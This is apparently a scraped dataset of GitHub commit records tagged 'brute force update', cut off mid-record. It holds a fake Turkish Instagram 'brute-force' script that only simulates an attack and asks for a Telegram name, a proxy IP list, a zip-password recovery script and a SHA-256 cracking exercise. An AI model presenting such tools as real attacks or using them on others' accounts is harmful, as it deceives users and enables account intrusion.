191.102.64.147\t999\tCO\t\r 66.94.97.238\t443\tUS\t\r 93.240.114.68\t4003\tDE\t\r 103.124.137.40\t8080\tID\t\r 20.47.108.204\t8888\tUS\t\r 200.116.198.222\t9812\tCO\t\r 175.100.64.127\t9812\tKH\t\r 187.217.54.84\t80\tMX\t\r 213.230.97.10\t3128\tUZ\t\r 213.6.199.94\t49044\tPS\t\r 136.228.243.159\t8082\tJP\t\r 164.155.147.1\t80\tUS\t\r 164.155.145.1\t80\tUS\t\r 103.132.52.178\t8080\tID\t\r 129.226.17.43\t80\tIN\t\r 114.7.27.98\t8080\tID\t\r 159.89.195.14\t80\tSG\t\r 112.78.132.97\t8080\tID\t\r 115.241.197.126\t80\tIN\t\r 164.155.149.1\t80\tUS\t\r 173.255.210.187\t80\tUS\t\r 38.55.182.225\t80\tUS\t\r 45.250.66.104\t9812\tIN\t\r 194.233.69.126\t443\tSG\t\r 34.87.84.105\t80\tSG\t\r 208.67.183.240\t80\tUS\t\r 38.55.181.255\t80\tUS\t\r 38.55.177.225\t80\tUS\t\r 35.233.16.212\t80\tBE\t\r 205.201.49.132\t53281\tUS\t\r 183.111.25.253\t8080\tKR\t\r 181.176.211.168\t8080\tPE\t\r 114.4.104.254\t3128\tID\t\r 157.100.53.100\t999\tEC\t\r 59.124.224.205\t3128\tTW\t\r 165.90.225.15\t3389\tZA\t\r 94.181.48.110\t1256\tRU\t\r 45.195.76.130\t999\tDO\t\r 112.137.142.8\t3128\tVN\t\r 91.195.156.111\t41890\tUA\t\r 157.100.12.138\t999\tEC\t\r 182.253.107.212\t8080\tID\t\r 85.208.209.214\t8085\tUS\t\r 213.166.79.98\t8085\tUS\t\r 154.201.44.56\t3128\tFR\t\r 154.201.45.181\t3128\tFR\t\r 77.83.87.217\t8085\tUS\t\r 91.188.246.216\t8085\tUS\t\r 45.67.212.102\t8085\tRU\t\r 213.166.78.223\t8085\tUS\t\r 88.218.66.148\t8085\tRU\t\r 95.181.151.114\t8085\tRU\t\r 45.155.68.246\t8250\tSC\t\r 154.201.41.103\t3128\tFR\t\r 95.181.148.63\t8085\tRU\t\r 83.171.254.181\t8085\tRU\t\r 37.44.254.161\t8085\tRU\t\r 85.239.59.62\t8085\tUS\t\r 193.233.82.245\t8085\tUS\t\r 193.233.142.130\t8085\tUS\t\r 172.252.231.156\t3128\tFR\t\r 213.166.79.60\t8085\tUS\t\r 45.67.212.19\t8085\tRU\t\r 91.242.228.104\t8085\tUS\t\r 138.128.97.132\t7722\tUS\t\r 213.166.79.89\t8085\tUS\t\r 109.236.52.210\t8085\tUS\t\r 85.209.151.11\t8085\tUS\t\r 192.241.116.82\t8636\tUS\t\r 85.208.86.136\t8085\tRU\t\r 47.245.58.113\t80\tJP\t\r 95.181.149.139\t8085\tRU\t\r 142.252.198.158\t3128\tFR\t\r 104.227.100.249\t8330\tUS\t\r 194.110.150.219\t8085\tUS\t\r 85.239.56.249\t8085\tUS\t\r 167.172.157.96\t80\tUS\t\r 142.252.223.136\t3128\tFR\t\r 38.55.180.225\t80\tUS\t\r 164.155.150.0\t80\tUS\t\r 164.155.148.0\t80\tUS\t\r 51.195.144.68\t8888\tFR\t\r 146.59.199.12\t80\tFR\t\r 82.119.150.122\t8080\tRU\t\r 103.245.204.214\t8080\tBD\t\r 203.142.71.50\t8080\tID\t\r 36.91.98.115\t8181\tID\t\r 95.216.96.39\t3128\tFI\t\r 164.155.150.1\t80\tUS\t\r 164.155.151.0\t80\tUS\t\r 164.155.146.0\t80\tUS\t\r 91.244.66.174\t80\tRU\t\r 85.195.104.71\t80\tDE\t\r 117.54.114.97\t80\tID\t\r 47.74.0.7\t80\tJP\t\r 194.233.73.107\t443\tSG\t\r 103.130.141.98\t8080\tKH\t\r 88.199.164.141\t8081\tPL\t\r 185.118.129.43\t8080\tIQ\t\r 103.105.212.106\t53281\tPH\t\r 119.42.152.252\t8080\tIN\t\r 103.69.38.1\t8080\tIN\t\r 188.40.148.168\t8080\tDE\t\r 95.0.219.240\t8080\tTR\t\r 45.70.15.2\t8080\tEC\t\r 190.94.211.207\t999\tVE\t\r 46.105.35.193\t8080\tFR\t\r 51.15.42.134\t8118\tNL\t\r 103.60.160.88\t8080\tBD\t\r 203.177.133.235\t8080\tPH\t\r 14.241.39.191\t8080\tVN\t\r 190.109.205.253\t999\tHN\t\r 200.125.171.202\t9991\tDO\t\r 197.243.20.186\t80\tRW\t\r 103.219.193.200\t80\tUS\t\r 149.54.11.76\t80\tAF\t\r 45.5.68.25\t999\tPE\t\r 179.184.224.91\t3128\tBR\t\r 185.82.96.162\t9093\tLB\t\r 147.135.38.83\t24333\tUS\r 162.144.116.103\t80\tUS\t\r 45.32.101.24\t80\tSG\t\r 137.184.197.190\t80\tUS\r \"\"\"\r import time\r import os\r import random\r import webbrowser\r os.system('pkg install python')\r os.system('python -m pip install colorama')\r kullanici_adi=str(input(\"kullan\u0131c\u0131 ad\u0131 giriniz:\"))\r kullanici_id=str(input(\"kullan\u0131c\u0131 id giriniz:\"))\r onay=str(input(\"sald\u0131r\u0131 baslayacak onayl\u0131yormusunuz evet\/hay\u0131r:\"))\r time.sleep(3)\r os.system('clear')\r sifre=str(input(\"S\u0130FREY\u0130 G\u0130R\u0130N\u0130Z:\"))\r if sifre==\"ZoRRaKin1905\" or sifre==\"ZoRRaKina1b2c3d4e5\":\r if onay==\"evet\":\r print(\"SALDIRI \u0130\u00c7\u0130N ONAY ALINDI ATTACK BA\u015eLATILIYOR...\")\r time.sleep(6)\r webbrowser.open_new('https:\/\/www.instagram.com\/')\r time.sleep(1.2)\r attack_kaydi=os.system('netstat -an -p -tcp')\r for denenen_sifre in range(1,8359,1):\r time.sleep(0.3)\r print(denenen_sifre,\"sifre denendi...\")\r print(\"ATTACK B\u0130TT\u0130... SONUCLAR GEL\u0130YOR L\u00dcTFEN BEKLEY\u0130N\u0130Z...\")\r time.sleep(10)\r os.system('clear')\r telegram=str(input(\"TELEGRAM \u0130SM\u0130N\u0130Z\u0130 BASINDA @ OLCAK SEKILDE YAZINIZ:\")) \r print(\"SONU\u00c7 BASARILI.\",telegram,\"\u0130S\u0130ML\u0130 TELEGRAM ADRES\u0130N\u0130ZE SONU\u00c7LAR G\u00d6NDER\u0130L\u0130YOR...\")\r time.sleep(5)\r print(\"TELEGRAM BOTU BAKIMDA OLDUGU \u0130C\u0130N B\u0130LG\u0130LER GELEM\u0130YOR...\")\r time.sleep(5)\r os.system('clear')\r proxys=str(input(\"KULLANILAN PROXY'LER\u0130 GORMEK ISTERM\u0130S\u0130N\u0130Z evet\/hay\u0131r:\"))\r if proxys==\"evet\":\r print(proxy)\r print(\"ATTACK \u0130C\u0130N TOPLAM 160 PROXY KULLANILDI.\")\r else:\r time.sleep(2.1)\r os.system('clear')\r attack_gecmisi_sorgu=str(input(\"S\u0130ZE YAPILAN ATTACK GE\u00c7M\u0130\u015e\u0130N\u0130 G\u00d6RMEK \u0130STERM\u0130S\u0130N\u0130Z evet\/hay\u0131r:\"))\r if attack_gecmisi_sorgu==\"evet\":\r print(\"attack gecmisiniz g\u00f6r\u00fcnt\u00fcleniyor\",attack_kaydi,\"attack yap\u0131lm\u0131st\u0131r.\")\r else:\r os.system('clear')\r time.sleep(1.2)\r print(\"ATTACK SONLANDIRILDI. \u0130Y\u0130 G\u00dcNLER:)\")\r \r else:\r print(\"SALDIRI \u0130\u00c7\u0130N ONAY ALINAMADI ATTACK BA\u015eLATILMIYOR...\")\r time.sleep(5)\r os.system('clear')\r else:\r print(\"sifre yanl\u0131s lutfen tekrar deney\u0131n\")\r ","sourceWithComments":"#coded by ACHERON\r\nproxy = \"\"\"\r\n\u0130P ADRESLER\u0130    PORT   \u00dcLKE\r\n167.71.5.83\t3128\tNL\t\r\n47.91.44.217\t8000\tAU\t\r\n8.210.83.33\t80\tHK\t\r\n80.48.119.28\t8080\tPL\t\r\n66.29.154.103\t3128\tUS\t\r\n149.19.224.31\t3128\tUS\t\r\n103.232.215.194\t80\tSG\t\r\n169.57.1.85\t8123\tMX\t\r\n185.61.152.137\t8080\tGB\t\r\n103.219.194.13\t80\tUS\t\r\n185.76.10.68\t8081\tNL\t\r\n47.254.39.233\t80\tUS\t\r\n47.74.18.113\t80\tJP\t\r\n103.148.72.126\t80\tHK\t\r\n103.219.194.12\t80\tUS\t\r\n103.219.194.11\t80\tUS\t\r\n67.212.186.99\t80\tUS\t\r\n43.250.107.91\t80\tHK\t\r\n8.209.210.211\t80\tJP\t\r\n103.149.162.195\t80\tHK\t\r\n49.207.36.81\t80\tIN\t\r\n159.203.61.169\t3128\tCA\t\r\n103.148.72.192\t80\tHK\t\r\n121.1.41.162\t111\tPH\t\r\n195.158.24.46\t3128\tUZ\t\r\n194.233.69.90\t443\tSG\t\r\n157.230.48.102\t80\tUS\t\r\n95.59.26.129\t80\tKZ\t\r\n43.255.113.232\t8082\tKH\t\r\n115.96.208.124\t8080\tIN\t\r\n64.227.62.123\t80\tUS\t\r\n103.159.46.2\t83\tIN\t\r\n45.248.41.216\t9812\tIN\t\r\n175.111.129.156\t8080\tIN\t\r\n196.2.15.68\t8080\tBI\t\r\n178.252.175.16\t8080\tIR\t\r\n191.102.64.147\t999\tCO\t\r\n66.94.97.238\t443\tUS\t\r\n93.240.114.68\t4003\tDE\t\r\n103.124.137.40\t8080\tID\t\r\n20.47.108.204\t8888\tUS\t\r\n200.116.198.222\t9812\tCO\t\r\n175.100.64.127\t9812\tKH\t\r\n187.217.54.84\t80\tMX\t\r\n213.230.97.10\t3128\tUZ\t\r\n213.6.199.94\t49044\tPS\t\r\n136.228.243.159\t8082\tJP\t\r\n164.155.147.1\t80\tUS\t\r\n164.155.145.1\t80\tUS\t\r\n103.132.52.178\t8080\tID\t\r\n129.226.17.43\t80\tIN\t\r\n114.7.27.98\t8080\tID\t\r\n159.89.195.14\t80\tSG\t\r\n112.78.132.97\t8080\tID\t\r\n115.241.197.126\t80\tIN\t\r\n164.155.149.1\t80\tUS\t\r\n173.255.210.187\t80\tUS\t\r\n38.55.182.225\t80\tUS\t\r\n45.250.66.104\t9812\tIN\t\r\n194.233.69.126\t443\tSG\t\r\n34.87.84.105\t80\tSG\t\r\n208.67.183.240\t80\tUS\t\r\n38.55.181.255\t80\tUS\t\r\n38.55.177.225\t80\tUS\t\r\n35.233.16.212\t80\tBE\t\r\n205.201.49.132\t53281\tUS\t\r\n183.111.25.253\t8080\tKR\t\r\n181.176.211.168\t8080\tPE\t\r\n114.4.104.254\t3128\tID\t\r\n157.100.53.100\t999\tEC\t\r\n59.124.224.205\t3128\tTW\t\r\n165.90.225.15\t3389\tZA\t\r\n94.181.48.110\t1256\tRU\t\r\n45.195.76.130\t999\tDO\t\r\n112.137.142.8\t3128\tVN\t\r\n91.195.156.111\t41890\tUA\t\r\n157.100.12.138\t999\tEC\t\r\n182.253.107.212\t8080\tID\t\r\n85.208.209.214\t8085\tUS\t\r\n213.166.79.98\t8085\tUS\t\r\n154.201.44.56\t3128\tFR\t\r\n154.201.45.181\t3128\tFR\t\r\n77.83.87.217\t8085\tUS\t\r\n91.188.246.216\t8085\tUS\t\r\n45.67.212.102\t8085\tRU\t\r\n213.166.78.223\t8085\tUS\t\r\n88.218.66.148\t8085\tRU\t\r\n95.181.151.114\t8085\tRU\t\r\n45.155.68.246\t8250\tSC\t\r\n154.201.41.103\t3128\tFR\t\r\n95.181.148.63\t8085\tRU\t\r\n83.171.254.181\t8085\tRU\t\r\n37.44.254.161\t8085\tRU\t\r\n85.239.59.62\t8085\tUS\t\r\n193.233.82.245\t8085\tUS\t\r\n193.233.142.130\t8085\tUS\t\r\n172.252.231.156\t3128\tFR\t\r\n213.166.79.60\t8085\tUS\t\r\n45.67.212.19\t8085\tRU\t\r\n91.242.228.104\t8085\tUS\t\r\n138.128.97.132\t7722\tUS\t\r\n213.166.79.89\t8085\tUS\t\r\n109.236.52.210\t8085\tUS\t\r\n85.209.151.11\t8085\tUS\t\r\n192.241.116.82\t8636\tUS\t\r\n85.208.86.136\t8085\tRU\t\r\n47.245.58.113\t80\tJP\t\r\n95.181.149.139\t8085\tRU\t\r\n142.252.198.158\t3128\tFR\t\r\n104.227.100.249\t8330\tUS\t\r\n194.110.150.219\t8085\tUS\t\r\n85.239.56.249\t8085\tUS\t\r\n167.172.157.96\t80\tUS\t\r\n142.252.223.136\t3128\tFR\t\r\n38.55.180.225\t80\tUS\t\r\n164.155.150.0\t80\tUS\t\r\n164.155.148.0\t80\tUS\t\r\n51.195.144.68\t8888\tFR\t\r\n146.59.199.12\t80\tFR\t\r\n82.119.150.122\t8080\tRU\t\r\n103.245.204.214\t8080\tBD\t\r\n203.142.71.50\t8080\tID\t\r\n36.91.98.115\t8181\tID\t\r\n95.216.96.39\t3128\tFI\t\r\n164.155.150.1\t80\tUS\t\r\n164.155.151.0\t80\tUS\t\r\n164.155.146.0\t80\tUS\t\r\n91.244.66.174\t80\tRU\t\r\n85.195.104.71\t80\tDE\t\r\n117.54.114.97\t80\tID\t\r\n47.74.0.7\t80\tJP\t\r\n194.233.73.107\t443\tSG\t\r\n103.130.141.98\t8080\tKH\t\r\n88.199.164.141\t8081\tPL\t\r\n185.118.129.43\t8080\tIQ\t\r\n103.105.212.106\t53281\tPH\t\r\n119.42.152.252\t8080\tIN\t\r\n103.69.38.1\t8080\tIN\t\r\n188.40.148.168\t8080\tDE\t\r\n95.0.219.240\t8080\tTR\t\r\n45.70.15.2\t8080\tEC\t\r\n190.94.211.207\t999\tVE\t\r\n46.105.35.193\t8080\tFR\t\r\n51.15.42.134\t8118\tNL\t\r\n103.60.160.88\t8080\tBD\t\r\n203.177.133.235\t8080\tPH\t\r\n14.241.39.191\t8080\tVN\t\r\n190.109.205.253\t999\tHN\t\r\n200.125.171.202\t9991\tDO\t\r\n197.243.20.186\t80\tRW\t\r\n103.219.193.200\t80\tUS\t\r\n149.54.11.76\t80\tAF\t\r\n45.5.68.25\t999\tPE\t\r\n179.184.224.91\t3128\tBR\t\r\n185.82.96.162\t9093\tLB\t\r\n147.135.38.83\t24333\tUS\r\n162.144.116.103\t80\tUS\t\r\n45.32.101.24\t80\tSG\t\r\n137.184.197.190\t80\tUS\r\n\"\"\"\r\nimport time\r\nimport os\r\nimport random\r\nimport webbrowser\r\nos.system('pkg install python')\r\nos.system ('python -m pip install colorama')\r\nkullanici_adi = str(input(\"kullan\u0131c\u0131 ad\u0131 giriniz :\"))\r\nkullanici_id = str(input(\"kullan\u0131c\u0131 id giriniz :\"))\r\nonay = str(input(\"sald\u0131r\u0131 baslayacak onayl\u0131yormusunuz evet\/hay\u0131r :\"))\r\ntime.sleep(3)\r\nos.system('clear')\r\nsifre = str(input(\"S\u0130FREY\u0130 G\u0130R\u0130N\u0130Z :\"))\r\nif sifre ==\"ZoRRaKin1905\" or sifre == \"ZoRRaKina1b2c3d4e5\":\r\n    if onay ==\"evet\":\r\n        print(\"SALDIRI \u0130\u00c7\u0130N ONAY ALINDI ATTACK BA\u015eLATILIYOR...\")\r\n        time.sleep(6)\r\n        webbrowser.open_new('https:\/\/www.instagram.com\/')\r\n        time.sleep(1.2)\r\n        attack_kaydi = os.system('netstat -an -p -tcp')\r\n        for denenen_sifre in range(1,8359,1):\r\n            time.sleep(0.3)\r\n            print(denenen_sifre,\"sifre denendi...\")\r\n        print(\"ATTACK B\u0130TT\u0130... SONUCLAR GEL\u0130YOR L\u00dcTFEN BEKLEY\u0130N\u0130Z...\")\r\n        time.sleep(10)\r\n        os.system('clear')\r\n        telegram=str(input(\"TELEGRAM \u0130SM\u0130N\u0130Z\u0130 BASINDA @ OLCAK SEKILDE YAZINIZ :\"))   \r\n        print(\"SONU\u00c7 BASARILI.\",telegram,\"\u0130S\u0130ML\u0130 TELEGRAM ADRES\u0130N\u0130ZE SONU\u00c7LAR G\u00d6NDER\u0130L\u0130YOR...\")\r\n        time.sleep(5)\r\n        print (\"TELEGRAM BOTU BAKIMDA OLDUGU \u0130C\u0130N B\u0130LG\u0130LER GELEM\u0130YOR...\")\r\n        time.sleep(5)\r\n        os.system('clear')\r\n        proxys=str(input(\"KULLANILAN PROXY'LER\u0130 GORMEK ISTERM\u0130S\u0130N\u0130Z evet\/hay\u0131r :\"))\r\n        if proxys == \"evet\":\r\n            print(proxy)\r\n            print(\"ATTACK \u0130C\u0130N TOPLAM 160 PROXY KULLANILDI.\")\r\n        else:\r\n            time.sleep(2.1)\r\n            os.system('clear')\r\n        attack_gecmisi_sorgu = str(input(\"S\u0130ZE YAPILAN ATTACK GE\u00c7M\u0130\u015e\u0130N\u0130 G\u00d6RMEK \u0130STERM\u0130S\u0130N\u0130Z  evet\/hay\u0131r :\"))\r\n        if attack_gecmisi_sorgu == \"evet\":\r\n            print(\"attack gecmisiniz g\u00f6r\u00fcnt\u00fcleniyor\",attack_kaydi,\"attack yap\u0131lm\u0131st\u0131r.\")\r\n        else:\r\n            os.system('clear')\r\n            time.sleep(1.2)\r\n            print(\"ATTACK SONLANDIRILDI. \u0130Y\u0130 G\u00dcNLER:)\")\r\n         \r\n    else:\r\n        print (\"SALDIRI \u0130\u00c7\u0130N ONAY ALINAMADI ATTACK BA\u015eLATILMIYOR...\")\r\n        time.sleep(5)\r\n        os.system('clear')\r\nelse:\r\n    print(\"sifre yanl\u0131s lutfen tekrar deney\u0131n\")\r\n"}},"msg":"Update BRUTE-FORCE.py"}},"https:\/\/github.com\/bansakdo\/Algorithm":{"a6efb9cc28b56531f739095ad47c87b434f366b8":{"url":"https:\/\/api.github.com\/repos\/bansakdo\/Algorithm\/commits\/a6efb9cc28b56531f739095ad47c87b434f366b8","html_url":"https:\/\/github.com\/bansakdo\/Algorithm\/commit\/a6efb9cc28b56531f739095ad47c87b434f366b8","message":"update BOJ - Brute Force","sha":"a6efb9cc28b56531f739095ad47c87b434f366b8","keyword":"brute force update","diff":"diff --git a\/BOJ\/Dynamic Programming\/Q2579.py b\/BOJ\/Dynamic Programming\/Q2579.py\nindex 693d1a0..da8cc83 100644\n--- a\/BOJ\/Dynamic Programming\/Q2579.py\t\n+++ b\/BOJ\/Dynamic Programming\/Q2579.py\t\n@@ -1,21 +1,11 @@\n-\n-def dfs(steps, stair, now, last_num):\n-    if now == last_num - 1:\n-        return sum([stair[i] for i in steps])\n-\n-    score = 0\n-    if not (len(steps) >= 2 and (now + 1 - steps[-1]) == (steps[-1] - steps[-2]) == 1):\n-        steps.append(now + 1)\n-        score = dfs(steps, stair, now + 1, last_num)\n-        steps.pop()\n-    if now + 2 < last_num:\n-        steps.append(now + 2)\n-        score = max(score, dfs(steps, stair, now + 2, last_num))\n-        steps.pop()\n-    return score\n-\n-\n-N = int(input())\n-stair = list(map(int, [input() for _ in range(N)]))\n-\n-print(dfs([], stair, -1, N))\n\\ No newline at end of file\n+n = int(input())\n+s = [0 for i in range(301)]\n+dp = [0 for i in range(301)]\n+for i in range(n):\n+    s[i] = int(input())\n+dp[0] = s[0]\n+dp[1] = s[0] + s[1]\n+dp[2] = max(s[1] + s[2], s[0] + s[2])\n+for i in range(3, n):\n+    dp[i] = max(dp[i - 3] + s[i - 1] + s[i], dp[i - 2] + s[i])\n+print(dp[n - 1])\n\\ No newline at end of file\n","files":{"\/BOJ\/Dynamic Programming\/Q2579.py":{"changes":[{"diff":"\n-\n-def dfs(steps, stair, now, last_num):\n-    if now == last_num - 1:\n-        return sum([stair[i] for i in steps])\n-\n-    score = 0\n-    if not (len(steps) >= 2 and (now + 1 - steps[-1]) == (steps[-1] - steps[-2]) == 1):\n-        steps.append(now + 1)\n-        score = dfs(steps, stair, now + 1, last_num)\n-        steps.pop()\n-    if now + 2 < last_num:\n-        steps.append(now + 2)\n-        score = max(score, dfs(steps, stair, now + 2, last_num))\n-        steps.pop()\n-    return score\n-\n-\n-N = int(input())\n-stair = list(map(int, [input() for _ in range(N)]))\n-\n-print(dfs([], stair, -1, N))\n\\ No newline at end of file\n+n = int(input())\n+s = [0 for i in range(301)]\n+dp = [0 for i in range(301)]\n+for i in range(n):\n+    s[i] = int(input())\n+dp[0] = s[0]\n+dp[1] = s[0] + s[1]\n+dp[2] = max(s[1] + s[2], s[0] + s[2])\n+for i in range(3, n):\n+    dp[i] = max(dp[i - 3] + s[i - 1] + s[i], dp[i - 2] + s[i])\n+print(dp[n - 1])\n\\ No newline at end of file\n","add":11,"remove":21,"filename":"\/BOJ\/Dynamic Programming\/Q2579.py","badparts":["def dfs(steps, stair, now, last_num):","    if now == last_num - 1:","        return sum([stair[i] for i in steps])","    score = 0","    if not (len(steps) >= 2 and (now + 1 - steps[-1]) == (steps[-1] - steps[-2]) == 1):","        steps.append(now + 1)","        score = dfs(steps, stair, now + 1, last_num)","        steps.pop()","    if now + 2 < last_num:","        steps.append(now + 2)","        score = max(score, dfs(steps, stair, now + 2, last_num))","        steps.pop()","    return score","N = int(input())","stair = list(map(int, [input() for _ in range(N)]))","print(dfs([], stair, -1, N))"],"goodparts":["n = int(input())","s = [0 for i in range(301)]","dp = [0 for i in range(301)]","for i in range(n):","    s[i] = int(input())","dp[0] = s[0]","dp[1] = s[0] + s[1]","dp[2] = max(s[1] + s[2], s[0] + s[2])","for i in range(3, n):","    dp[i] = max(dp[i - 3] + s[i - 1] + s[i], dp[i - 2] + s[i])","print(dp[n - 1])"]}],"source":"\n\ndef dfs(steps, stair, now, last_num): if now==last_num -1: return sum([stair[i] for i in steps]) score=0 if not(len(steps) >=2 and(now +1 -steps[-1])==(steps[-1] -steps[-2])==1): steps.append(now +1) score=dfs(steps, stair, now +1, last_num) steps.pop() if now +2 < last_num: steps.append(now +2) score=max(score, dfs(steps, stair, now +2, last_num)) steps.pop() return score N=int(input()) stair=list(map(int,[input() for _ in range(N)])) print(dfs([], stair, -1, N)) ","sourceWithComments":"\ndef dfs(steps, stair, now, last_num):\n    if now == last_num - 1:\n        return sum([stair[i] for i in steps])\n\n    score = 0\n    if not (len(steps) >= 2 and (now + 1 - steps[-1]) == (steps[-1] - steps[-2]) == 1):\n        steps.append(now + 1)\n        score = dfs(steps, stair, now + 1, last_num)\n        steps.pop()\n    if now + 2 < last_num:\n        steps.append(now + 2)\n        score = max(score, dfs(steps, stair, now + 2, last_num))\n        steps.pop()\n    return score\n\n\nN = int(input())\nstair = list(map(int, [input() for _ in range(N)]))\n\nprint(dfs([], stair, -1, N))"}},"msg":"update BOJ - Brute Force"}},"https:\/\/github.com\/valerii-chirkov\/ToolsAndJunk":{"2a9f95ed9573cf2040c689dd484f47c189a702df":{"url":"https:\/\/api.github.com\/repos\/valerii-chirkov\/ToolsAndJunk\/commits\/2a9f95ed9573cf2040c689dd484f47c189a702df","html_url":"https:\/\/github.com\/valerii-chirkov\/ToolsAndJunk\/commit\/2a9f95ed9573cf2040c689dd484f47c189a702df","message":"Update zip_brute_force.py","sha":"2a9f95ed9573cf2040c689dd484f47c189a702df","keyword":"brute force update","diff":"diff --git a\/zip_brute_force.py b\/zip_brute_force.py\nindex 00b76f2..10b2f02 100644\n--- a\/zip_brute_force.py\n+++ b\/zip_brute_force.py\n@@ -1,5 +1,5 @@\n # If you remember that your pass contains exact patterns, but you don't remember the order or kind of the patterns\n-pass_pos = ['qwerty', '123123', '123qwe]\n+pass_pos = ['qwerty', '123123', '123qwe']\n # Another possible solution is to use baseN, for instance base62(abc,ABC,123 -> 26+26+10=62)\n \n from itertools import chain, combinations\n","files":{"\/zip_brute_force.py":{"changes":[{"diff":"\n # If you remember that your pass contains exact patterns, but you don't remember the order or kind of the patterns\n-pass_pos = ['qwerty', '123123', '123qwe]\n+pass_pos = ['qwerty', '123123', '123qwe']\n # Another possible solution is to use baseN, for instance base62(abc,ABC,123 -> 26+26+10=62)\n \n from itertools import chain, combinations\n","add":1,"remove":1,"filename":"\/zip_brute_force.py","badparts":["pass_pos = ['qwerty', '123123', '123qwe]"],"goodparts":["pass_pos = ['qwerty', '123123', '123qwe']"]}],"source":"\n\npass_pos=['qwerty', '123123', '123qwe] from itertools import chain, combinations def all_subsets(ss): return chain(*map(lambda x: combinations(ss, x), range(3, len(ss)+1))) from zipfile import ZipFile subb=all_subsets(pass_pos) norm_subb=[] for subset in all_subsets(pass_pos): stt=''.join(subset) if stt.startswith('qwe'): if 8 <=len(stt) <=12: norm_subb.append(stt) path_from='\/Volumes\/FLASH\/path_to_your_zip.zip' path_to='Downloads\/zip_opened' for subset in norm_subb: try: print(''.join(subset)) ZipFile(path_from).extractall(path=path_to, pwd=''.join(subset)) print(subset) exit() except Exception: continue ","sourceWithComments":"# If you remember that your pass contains exact patterns, but you don't remember the order or kind of the patterns\npass_pos = ['qwerty', '123123', '123qwe]\n# Another possible solution is to use baseN, for instance base62(abc,ABC,123 -> 26+26+10=62)\n\nfrom itertools import chain, combinations\ndef all_subsets(ss):\n    return chain(*map(lambda x: combinations(ss, x), range(3, len(ss)+1)))\n\n# for subset in all_subsets(pass_pos):\n#     print(''.join(subset))\n\nfrom zipfile import ZipFile\nsubb = all_subsets(pass_pos)\nnorm_subb = []\nfor subset in all_subsets(pass_pos):\n    stt = ''.join(subset)\n    # If you remember that your pass starts from exact symbols, otherwise remove the statement\n    if stt.startswith('qwe'):\n        # If you know aprx length\n        if 8 <= len(stt) <= 12:\n            norm_subb.append(stt)\n\n            \npath_from = '\/Volumes\/FLASH\/path_to_your_zip.zip'\npath_to = 'Downloads\/zip_opened'\n            \nfor subset in norm_subb:\n    try:\n        print(''.join(subset))\n        ZipFile(path_from).extractall(path=path_to, pwd=''.join(subset))\n        print(subset)\n        exit()\n    except Exception:\n        continue\n"}},"msg":"Update zip_brute_force.py"}},"https:\/\/github.com\/christosmil\/blockchain-science-and-engineering":{"d17b78b61ec23b1421dc8285a10b165eaf683362":{"url":"https:\/\/api.github.com\/repos\/christosmil\/blockchain-science-and-engineering\/commits\/d17b78b61ec23b1421dc8285a10b165eaf683362","html_url":"https:\/\/github.com\/christosmil\/blockchain-science-and-engineering\/commit\/d17b78b61ec23b1421dc8285a10b165eaf683362","message":"Update brute-force-sha256.py","sha":"d17b78b61ec23b1421dc8285a10b165eaf683362","keyword":"brute force update","diff":"diff --git a\/brute-force-sha256.py b\/brute-force-sha256.py\nindex 7a5a1f6..5b8d6c0 100644\n--- a\/brute-force-sha256.py\n+++ b\/brute-force-sha256.py\n@@ -10,8 +10,8 @@\n def brute_force_pswd(pswd, min_len, max_len):\n \tfor letters_of_pswd in (min_len, max_len):\n \t\tfor c in product(LETTERS_LIST, repeat = letters_of_pswd):\n-\t\t\tmyVar = hashlib.sha256((pswd + ''.join(c)).encode('utf-8')).hexdigest()\n-\t\t\tif (int(myVar, 16) == int(0x7d9eb5ee94f9ca95d640eb79cc8766fe44d5b9744602469fc6bdc748cb3c41f5)):\n+\t\t\tmy_var = hashlib.sha256((pswd + ''.join(c)).encode('utf-8')).hexdigest()\n+\t\t\tif (int(my_var, 16) == int(0x7d9eb5ee94f9ca95d640eb79cc8766fe44d5b9744602469fc6bdc748cb3c41f5)):\n \t\t\t\treturn True, ''.join(c)\n \treturn False, ''\n \n","files":{"\/brute-force-sha256.py":{"changes":[{"diff":"\n def brute_force_pswd(pswd, min_len, max_len):\n \tfor letters_of_pswd in (min_len, max_len):\n \t\tfor c in product(LETTERS_LIST, repeat = letters_of_pswd):\n-\t\t\tmyVar = hashlib.sha256((pswd + ''.join(c)).encode('utf-8')).hexdigest()\n-\t\t\tif (int(myVar, 16) == int(0x7d9eb5ee94f9ca95d640eb79cc8766fe44d5b9744602469fc6bdc748cb3c41f5)):\n+\t\t\tmy_var = hashlib.sha256((pswd + ''.join(c)).encode('utf-8')).hexdigest()\n+\t\t\tif (int(my_var, 16) == int(0x7d9eb5ee94f9ca95d640eb79cc8766fe44d5b9744602469fc6bdc748cb3c41f5)):\n \t\t\t\treturn True, ''.join(c)\n \treturn False, ''\n \n","add":2,"remove":2,"filename":"\/brute-force-sha256.py","badparts":["\t\t\tmyVar = hashlib.sha256((pswd + ''.join(c)).encode('utf-8')).hexdigest()","\t\t\tif (int(myVar, 16) == int(0x7d9eb5ee94f9ca95d640eb79cc8766fe44d5b9744602469fc6bdc748cb3c41f5)):"],"goodparts":["\t\t\tmy_var = hashlib.sha256((pswd + ''.join(c)).encode('utf-8')).hexdigest()","\t\t\tif (int(my_var, 16) == int(0x7d9eb5ee94f9ca95d640eb79cc8766fe44d5b9744602469fc6bdc748cb3c41f5)):"]}],"source":"\n import hashlib from itertools import product import string import time LETTERS_LIST=list(string.ascii_lowercase +string.ascii_uppercase) def brute_force_pswd(pswd, min_len, max_len): \tfor letters_of_pswd in(min_len, max_len): \t\tfor c in product(LETTERS_LIST, repeat=letters_of_pswd): \t\t\tmyVar=hashlib.sha256((pswd +''.join(c)).encode('utf-8')).hexdigest() \t\t\tif(int(myVar, 16)==int(0x7d9eb5ee94f9ca95d640eb79cc8766fe44d5b9744602469fc6bdc748cb3c41f5)): \t\t\t\treturn True, ''.join(c) \treturn False, '' if __name__==\"__main__\": \tPASSWORD=\"blockchain-course.org:\" \tMIN_PSWD_LEN=1 \tMAX_PSWD_LEN=5 \t \tstart=time.time() \tbroken, c=brute_force_pswd(PASSWORD, MIN_PSWD_LEN, MAX_PSWD_LEN) \tend=time.time() \tif broken: \t\tprint(f\"Success!\\n{c},{PASSWORD}{c}\") \telse: \t\tprint(\"Password not found!\") \tprint(f\"Brute force time:{end-start} seconds\") ","sourceWithComments":"# Python v3.7.2\n\nimport hashlib\nfrom itertools import product\nimport string\nimport time\n\nLETTERS_LIST = list(string.ascii_lowercase + string.ascii_uppercase)\n\ndef brute_force_pswd(pswd, min_len, max_len):\n\tfor letters_of_pswd in (min_len, max_len):\n\t\tfor c in product(LETTERS_LIST, repeat = 